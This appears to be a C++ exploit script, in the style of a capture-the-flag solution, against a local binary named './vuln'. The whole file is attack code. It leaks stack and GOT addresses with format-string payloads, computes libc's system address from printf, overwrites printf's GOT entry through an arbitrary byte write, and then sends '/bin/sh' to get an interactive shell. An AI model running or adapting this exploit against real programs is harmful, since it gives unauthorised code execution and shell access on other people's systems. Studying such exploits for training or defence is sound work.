//overwrite_got_plt
#include <string>
#include <iostream>
#include <pwntools>

int main(){
using namespace pwn;
ELF libc{"/lib/x86_64-linux-gnu/libc.so.6"};
int64_t libc_offset=libc["_IO_printf"]-libc["system"];
std::cout <<libc_offset;
Process p{"./vuln",NULL,0};
p.set_debug(true);
std::string payload1;
payload1.append("%11$lx");
p.sendline(payload1);
std::string vuln_fun_re=p.recv(12);
p.recv(1); //recv the \n
long printf_got_plt=hexstr2long(vuln_fun_re)+0x2dc7; //offset
std::string payload2;
payload2.append("%13$sAAA");
payload2+=p64(printf_got_plt);
p.sendline(payload2);
std::string tmp=p.recv(6);//little endian
std::reverse(tmp.begin(),tmp.end());
long libc_printf=str2long(tmp);
long libc_system=libc_printf-libc_offset;
int nbytes=3;
int base=6+4+2;
std::string payload3=arbitrary_byte_write(printf_got_plt,libc_system,nbytes,base);
p.sendline(payload3);
p.recv(1024);
p.sendline("/bin/sh");
p.interactive();
}